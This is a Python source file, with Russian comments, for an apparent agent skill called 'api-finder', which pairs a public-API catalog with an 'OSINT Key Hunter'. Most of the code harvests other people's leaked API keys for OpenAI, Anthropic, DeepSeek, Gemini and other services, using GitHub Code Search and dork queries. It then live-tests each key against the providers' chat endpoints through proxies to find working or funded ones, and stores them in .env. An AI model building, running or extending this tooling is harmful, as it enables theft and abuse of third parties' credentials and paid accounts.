    return {'keys': all_keys, 'total': len(all_keys), 'processed_files': len(processed)}

# ═══════════════════════════════════════════════════════════════════════════
# ███  ИНСТРУМЕНТЫ (tool functions)  ███████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

def search_api_catalog(category: str = None, query: str = None, limit: int = 20) -> Dict:
    """Поиск в каталоге Public-APIs по категории или ключевому слову."""
    apis = _get_catalog()
    results = _filter_catalog(apis, category, query)
    
    # Категории
    categories = defaultdict(int)
    for a in apis:
        categories[a.get('category', 'Other')] += 1
    
    return {
        'total_in_catalog': len(apis),
        'found': len(results),
        'results': results[:limit],
        'top_categories': dict(sorted(categories.items(), key=lambda x: -x[1])[:15]),
    }

def suggest_skill_from_api(api_name: str) -> Dict:
    """Предлагает идею скилла на основе найденного API."""
    apis = _get_catalog()
    matches = [a for a in apis if api_name.lower() in a.get('name', '').lower()]
    
    if not matches:
        return {'error': f'API "{api_name}" не найден в каталоге', 'suggestions': []}
    
    api = matches[0]
    category = api.get('category', 'Other')
    auth = api.get('auth', 'unknown')
    
    suggestions = []
    
    # Генерируем идеи на основе категории
    skill_ideas = {
        'Machine Learning': ['ai-inference', 'model-router'],
        'Text Analysis': ['sentiment-analyzer', 'text-summarizer'],
        'Text-to-Speech': ['voice-tts', 'audio-narrator'],
        'SMS': ['sms-sender', 'notification-gateway'],
        'Messaging': ['telegram-bot', 'chat-gateway'],
        'Currency': ['currency-tracker', 'crypto-monitor'],
        'Finance': ['expense-tracker', 'stock-watcher'],
        'Weather': ['weather-forecast', 'climate-monitor'],
        'Email': ['email-brief', 'gmail-agent'],
        'Maps': ['traffic-monitor', 'geo-finder'],
        'Geocoding': ['location-resolver', 'address-finder'],
        'Music': ['music-recommender', 'playlist-generator'],
        'Audio': ['audio-processor', 'sound-analyzer'],
        'Video': ['youtube-search', 'video-downloader'],
        'YouTube': ['youtube-search', 'channel-monitor'],
        'Health': ['health-tracker', 'med-reminder'],
        'Fitness': ['workout-planner', 'step-counter'],
        'News': ['rss-aggregator', 'news-digest'],
        'Authentication': ['login-gateway', 'oauth-proxy'],
    }
    
    for cat_key, skills in skill_ideas.items():
        if cat_key.lower() in category.lower():
            suggestions.extend(skills)
    
    return {
        'api': api,
        'category': category,
        'auth_type': auth,
        'suggested_skills': suggestions[:5],
        'template': f'''# {api_name.replace(" ", "-").lower()}-skill
# Auto-generated suggestion by api-finder

class {api_name.replace(" ", "").replace("-", "").title()}Skill:
    """Скилл для работы с {api.get('name', api_name)}."""
    
    def __init__(self):
        self.api_url = "{api.get('url', '')}"
    
    def run(self, **kwargs):
        pass
'''
    }

def search_ddg(query: str, max_results: int = 10) -> Dict:
    """Поиск в DuckDuckGo."""
    results = _search_ddg(query, max_results)
    keys_found = _search_ddg_for_keys(query, max_results)
    return {
        'query': query,
        'total': len(results),
        'results': results,
        'keys_found': keys_found if keys_found else None,
    }

def hunt_keys_ddg(query: str = None, max_results: int = 10) -> Dict:
    """
    Охота на ключи через DDG с dorks-запросами.
    Если query не указан — ищет по всем сервисам.
    """
    all_keys = []
    queries_used = []
    
    if query:
        keys = _search_ddg_for_keys(query, max_results)
        all_keys.extend(keys)
        queries_used.append(query)
    else:
        # Поиск по всем сервисам
        dorks = [
            'site:github.com "DEEPSEEK_API_KEY" "sk-" extension:env',
            'site:github.com "OPENAI_API_KEY" "sk-" extension:env',
            'site:github.com "ANTHROPIC_API_KEY" "sk-ant" extension:env',
            'site:github.com "GEMINI_API_KEY" "AIza" extension:env',
            'site:github.com "HUGGINGFACE_API_KEY" "hf_" extension:env',
            'site:github.com "ELEVENLABS_API_KEY" "sk_" extension:env',
        ]
        for dork in dorks:
            keys = _search_ddg_for_keys(dork, max_results)
            all_keys.extend(keys)
            queries_used.append(dork)
    
    # Уникальные и фильтр
    unique = list(set(all_keys))
    unique = [k for k in unique if not _is_fake_or_placeholder(k)]
    
    return {
        'method': 'ddg_dorks',
        'queries': queries_used,
        'total_found': len(unique),
        'keys': unique[:50],
    }

def hunt_keys_github(max_pages: int = 1) -> Dict:
    """
    Охота на ключи через GitHub Code Search API.
    Использует GITHUB_TOKEN из .env.
    """
    token = _get_env_var('GITHUB_TOKEN')
    
    if not token:
        return {
            'error': 'no_github_token',
            'message': 'GITHUB_TOKEN не найден в .env. Добавь токен или используй hunt_keys_ddg.',
        }
    
    result = _hunt_keys_github(token, max_pages)
    
    # Сохраняем в кеш
    if result.get('keys'):
        cache = _load_hunt_results()
        cache['github_hunt'] = {
            'date': datetime.now().isoformat(),
            'total': result['total'],
            'keys': {k: v for k, v in result['keys'].items()},
        }
        _save_hunt_results(cache)
    
    return {
        'method': 'github_api',
        'total_found': result.get('total', 0),
        'keys': list(result.get('keys', {}).keys())[:50],
        'processed_files': result.get('processed_files', 0),
    }

def validate_keys(keys: List[str], service: str = None) -> Dict:
    """
    Базовая валидация формата ключей (без live-запроса).
    Авто-определение сервиса если не указан.
    """
    results = {'total': len(keys), 'valid_format': [], 'invalid': [], 'by_service': defaultdict(list)}
    
    for key in keys:
        key = key.strip()
        if not key:
            continue
        
        # Авто-определение сервиса
        detected = service
        if not detected:
            for svc_type, cfg in API_PATTERNS.items():
                if any(key.startswith(p) for p in cfg['prefixes']):
                    detected = svc_type
                    break
        
        if not detected:
            results['invalid'].append({'key': key, 'reason': 'unknown_service'})
            continue
        
        # Проверка формата
        if detected == 'deepseek':
            fmt_result = _validate_deepseek_format(key)
        else:
            fmt_result = _validate_key_format(key, detected)
        
        entry = {'key': key, 'service': API_PATTERNS.get(detected, {}).get('service', detected), **fmt_result}
        
        if fmt_result['valid']:
            results['valid_format'].append(entry)
        else:
            results['invalid'].append(entry)
        
        results['by_service'][detected].append(entry)
    
    results['by_service'] = dict(results['by_service'])
    return results

def live_validate_keys(keys: List[str], service: str, proxy_http: str = None, 
                        concurrency: int = 5, delay: float = 0.35, timeout: int = 15) -> Dict:
    """
    Живая проверка ключей (HTTP-запросы к API).
    
    Аргументы:
    - keys: список ключей
    - service: тип сервиса (deepseek, openai_legacy, anthropic, ...)
    - proxy_http: http://host:port (опционально)
    - concurrency: одновременных запросов (1-10)
    - delay: задержка между запросами в одном потоке (сек)
    - timeout: таймаут запроса (сек)
    """
    if not HAS_HTTPX:
        return {'error': 'httpx_not_installed', 'message': 'pip install httpx'}
    
    if service not in API_PATTERNS:
        return {'error': 'unknown_service', 
                'available': list(API_PATTERNS.keys()),
                'message': f'Сервис "{service}" не найден. Выберите из списка.'}
    
    # Настройка прокси
    proxy = None
    if proxy_http:
        proxy = ProxyConfig(https=proxy_http, http=proxy_http, enabled=True)
    else:
        # Проверяем, нужен ли прокси для сервиса
        net_profile = SERVICE_NET_PROFILES.get(API_PATTERNS[service]['service'])
        if net_profile and net_profile.proxy_recommended:
            proxy = _load_proxy_from_env()
            if not proxy.https and not proxy.http:
                proxy = None  # нет настроенного прокси
    
    # Запуск проверки
    results = asyncio.run(_live_validate_batch(
        keys, service, proxy, 
        concurrency=min(concurrency, 10),
        delay=delay,
        timeout=timeout
    ))
    
    # Статистика
    stats = defaultdict(int)
    for r in results:
        stats[r['status']] += 1
    
    # Сохраняем в кеш охоты
    cache = _load_hunt_results()
    live_key = f'live_{service}_{datetime.now().strftime("%Y%m%d_%H%M%S")}'
    cache[live_key] = {
        'date': datetime.now().isoformat(),
        'service': service,
        'stats': dict(stats),
        'results': results,
    }
    _save_hunt_results(cache)
    
    return {
        'service': API_PATTERNS[service]['service'],
        'endpoint': API_PATTERNS[service]['live_endpoint'],
        'proxy_used': proxy.https if proxy else None,
        'total': len(keys),
        'stats': dict(stats),
        'results': results,
    }

def live_validate_hunt_results(service: str = 'deepseek', 
                                proxy_http: str = None,
                                concurrency: int = 5,
                                delay: float = 0.35) -> Dict:
    """
    Проверяет все ключи из кеша охоты для указанного сервиса.
    Берёт ключи из hunt_results.json → прогоняет через live-запрос.
    """
    cache = _load_hunt_results()
    
    # Собираем все ключи из всех охот
    all_keys = []
    for hunt_key, hunt_data in cache.items():
        if hunt_key.startswith('live_'):
            continue
        keys_dict = hunt_data.get('keys', {})
        for k, v in keys_dict.items():
            if v.get('service') == service or service in v.get('service', ''):
                all_keys.append(k)
    
    # Убираем дубликаты
    all_keys = list(set(all_keys))
    
    if not all_keys:
        return {'error': 'no_keys', 'message': f'Нет ключей для сервиса "{service}" в кеше охоты.'}
    
    return live_validate_keys(all_keys, service, proxy_http, concurrency, delay)

def show_validator_info() -> Dict:
    """Показывает информацию о всех валидаторах."""
    validators = {}
    for svc_type, cfg in API_PATTERNS.items():
        net = SERVICE_NET_PROFILES.get(cfg['service'])
        validators[svc_type] = {
            'service': cfg['service'],
            'prefixes': cfg['prefixes'],
            'key_lengths': cfg['lengths'],
            'endpoint': cfg['live_endpoint'],
            'method': cfg['live_method'],
            'needs_proxy': net.proxy_recommended if net else False,
            'works_direct': net.works_direct if net else True,
            'notes': net.notes if net else '',
        }
    
    return {
        'total_validators': len(validators),
        'validators': validators,
        'proxy_config': {
            'loaded': _load_proxy_from_env().https or 'not set',
            'env_vars': ['PROXY_HTTP', 'PROXY_HTTPS', 'PROXY_SOCKS5', 'PROXY_ENABLED'],
        }
    }

def set_proxy(http: str = None, https: str = None, socks5: str = None, enabled: bool = True) -> Dict:
    """Устанавливает настройки прокси в .env."""
    proxy = ProxyConfig(http=http, https=https, socks5=socks5, enabled=enabled)
    ok = _save_proxy_to_env(proxy)
    return {
        'success': ok,
        'proxy': {
            'http': proxy.http,
            'https': proxy.https,
            'socks5': proxy.socks5,
            'enabled': proxy.enabled,
        }
    }

def show_proxy_config() -> Dict:
    """Показывает текущую конфигурацию прокси."""
    proxy = _load_proxy_from_env()
    return {
        'proxy': {
            'http': proxy.http,
            'https': proxy.https,
            'socks5': proxy.socks5,
            'enabled': proxy.enabled,
        },
        'network_profiles': {
            svc: {
                'works_direct': p.works_direct,
                'proxy_recommended': p.proxy_recommended,
                'notes': p.notes,
            }
            for svc, p in SERVICE_NET_PROFILES.items()
        }
    }

def check_proxy_needed(service: str) -> Dict:
    """Проверяет, нужен ли прокси для конкретного сервиса."""
    for svc_key, profile in SERVICE_NET_PROFILES.items():
        if profile.service.lower() == service.lower() or svc_key.lower() == service.lower():
            return {
                'service': profile.service,
                'works_direct': profile.works_direct,
                'proxy_recommended': profile.proxy_recommended,
                'notes': profile.notes,
                'endpoints': profile.endpoints,
            }
    
    return {
        'service': service,
        'found': False,
        'message': f'Сервис "{service}" не найден. Доступные: {list(SERVICE_NET_PROFILES.keys())}',
    }

def save_keys_to_env(key_name: str, key_value: str) -> Dict:
    """Сохраняет ключ в .env."""
    ok = _set_env_var(key_name, key_value)
    return {'success': ok, 'key_name': key_name}

def get_env_keys() -> Dict:
    """Показывает все ключи в .env (с маскировкой)."""
    env_text = _read_env()
    keys = {}
    for line in env_text.split('\n'):
        line = line.strip()
        if line.startswith('#') or '=' not in line:
            continue
        k, _, v = line.partition('=')
        k = k.strip()
        v = v.strip().strip('"').strip("'")
        if any(kw in k.upper() for kw in ['KEY', 'TOKEN', 'SECRET']) and v:
            masked = v[:4] + '...' + v[-4:] if len(v) > 10 else '***'
            keys[k] = masked
    return {'keys': keys, 'total': len(keys)}

# ═══════════════════════════════════════════════════════════════════════════
# ███  ТОЧКИ ВХОДА  ████████████████████████████████████████████████████████
# ═══════════════════════════════════════════════════════════════════════════

SKILL_MD = """# api-finder v7.0.0 — OSINT Key Hunter + API Catalog

## Три модуля

### 📚 Каталог Public-APIs
- search_api_catalog — поиск по 1554+ API из public-apis
- suggest_skill_from_api — генерация шаблона скилла

### 🕵️ GitHub OSINT Key Hunter
- hunt_keys_github — GitHub Code Search API (нужен GITHUB_TOKEN)
- hunt_keys_ddg — DuckDuckGo Dorks (бесплатно)

### 🔬 Валидаторы (16 сервисов)
- validate_keys — проверка формата
- live_validate_keys — HTTP-запрос к API [ИСПРАВЛЕНО: правильный ендпоинт chat/completions]
- live_validate_hunt_results — массовая проверка из кеша

### 🔑 Управление .env
- save_keys_to_env, get_env_keys, set_proxy, show_proxy_config

## FIXED in v7.0:
- DeepSeek: `/v1/chat/completions` (POST) вместо `/v1/models` (GET)
- code_map: 200=WORKING, 402=NO_BALANCE, 401/403=INVALID
- Rate-limiting: concurrency + delay между запросами
"""
